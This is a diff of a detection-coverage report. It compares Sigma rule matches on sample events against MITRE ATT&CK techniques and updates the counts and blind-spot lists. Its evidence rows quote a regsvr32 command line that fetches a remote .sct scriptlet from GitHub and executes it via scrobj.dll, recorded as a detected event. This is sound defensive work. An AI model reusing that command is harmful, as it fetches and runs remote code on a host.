@@ -7,13 +7,13 @@
 | | |
 |---|---|
 | Events scanned | 6 |
-| Rules loaded | 2456 |
-| Detections | 2 |
+| Rules loaded | 2458 |
+| Detections | 3 |
 | Techniques observed | 2 |
-| Ruleset coverage | 306 of 697 enterprise techniques |
-| **Blind spots** | **391 techniques with no detection rule** |
+| Ruleset coverage | 308 of 697 enterprise techniques |
+| **Blind spots** | **389 techniques with no detection rule** |
 
-> **Evaluation caveats:** 94 rules use Sigma grammar outside the
+> **Evaluation caveats:** 1 rules use Sigma grammar outside the
 > supported subset and were not evaluated; 0 rules errored and were
 > skipped. Neither group counts toward coverage.
 
@@ -21,13 +21,14 @@
 
 | Rule | Level | ATT&CK | Evidence |
 |---|---|---|---|
+| Potential Regsvr32 Commandline Flag Anomaly | medium | T1218.010 Regsvr32 | `Image=C:\Windows\System32\regsvr32.exe` `CommandLine=/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll` |
 | Potentially Suspicious Regsvr32 HTTP/FTP Pattern | medium | T1218.010 Regsvr32 | `Image=C:\Windows\System32\regsvr32.exe` `CommandLine=/u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll` |
 | Network Connection Initiated By Regsvr32.EXE | medium | T1559.001 Component Object Model, T1218.010 Regsvr32 | `Initiated=True` `Image=C:\Windows\System32\regsvr32.exe` |
 
 ## ATT&CK coverage of the loaded ruleset
 
-The loaded ruleset references **306 of 697**
-enterprise techniques. **391 techniques have no detection rule at all.**
+The loaded ruleset references **308 of 697**
+enterprise techniques. **389 techniques have no detection rule at all.**
 A covered technique has at least one rule tagged to it; that is a much weaker statement than
 "this activity would be detected."
 
@@ -37,7 +38,7 @@ A covered technique has at least one rule tagged to it; that is a much weaker st
 | command-and-control | 23 | 45 | 51% |
 | credential-access | 35 | 67 | 52% |
 | defense-impairment | 13 | 56 | 23% |
-| discovery | 31 | 49 | 63% |
+| discovery | 33 | 49 | 67% |
 | execution | 32 | 64 | 50% |
 | exfiltration | 8 | 19 | 42% |
 | impact | 12 | 33 | 36% |
@@ -55,7 +56,7 @@ A covered technique has at least one rule tagged to it; that is a much weaker st
 - **command-and-control** (22 uncovered): T1001, T1001.001, T1001.002, T1071.002, T1071.003, T1071.005, T1090.004, T1092, T1104, T1132, T1132.002, T1205, T1205.001, T1205.002, T1219.001, T1219.003, T1568.001, T1568.003, T1573.001, T1573.002, T1659, T1665
 - **credential-access** (32 uncovered): T1003.007, T1003.008, T1056.003, T1056.004, T1110.003, T1110.004, T1111, T1552.003, T1552.005, T1552.007, T1552.008, T1555.001, T1555.002, T1555.006, T1556.001, T1556.003, T1556.004, T1556.005, T1556.006, T1556.007, T1556.008, T1556.009, T1557.002, T1557.004, T1558.001, T1558.002, T1558.004, T1558.005, T1606, T1606.001, T1606.002, T1621
 - **defense-impairment** (43 uncovered): T1222.002, T1484, T1484.002, T1553.001, T1553.006, T1556.001, T1556.003, T1556.004, T1556.005, T1556.006, T1556.007, T1556.008, T1556.009, T1578, T1578.001, T1578.002, T1578.003, T1578.004, T1578.005, T1599, T1600, T1600.001, T1600.002, T1601, T1601.001, T1601.002, T1647, T1666, T1685, T1685.001, T1685.002, T1685.003, T1685.004, T1685.005, T1685.006, T1686, T1686.001, T1686.002, T1686.003, T1687, T1688, T1689, T1690
-- **discovery** (18 uncovered): T1016.001, T1016.002, T1069.003, T1087.003, T1087.004, T1497, T1497.002, T1497.003, T1518.002, T1538, T1580, T1613, T1614, T1619, T1652, T1654, T1673, T1680
+- **discovery** (16 uncovered): T1016.001, T1069.003, T1087.003, T1087.004, T1497, T1497.002, T1497.003, T1518.002, T1538, T1580, T1613, T1619, T1652, T1654, T1673, T1680
 - **execution** (32 uncovered): T1053.003, T1053.006, T1053.007, T1059.002, T1059.004, T1059.008, T1059.009, T1059.010, T1059.011, T1059.012, T1059.013, T1127.002, T1127.003, T1204.003, T1204.005, T1559, T1559.003, T1569.001, T1569.003, T1574.004, T1574.006, T1574.009, T1574.010, T1574.013, T1574.014, T1609, T1610, T1648, T1651, T1674, T1675, T1677
 - **exfiltration** (11 uncovered): T1011, T1011.001, T1020.001, T1029, T1030, T1048.002, T1052, T1052.001, T1537, T1567.003, T1567.004
 - **impact** (21 uncovered): T1485.001, T1491, T1491.002, T1495, T1496.001, T1496.002, T1496.003, T1496.004, T1498, T1498.001, T1498.002, T1499, T1499.002, T1499.003, T1561, T1561.001, T1561.002, T1565.001, T1565.003, T1657, T1667
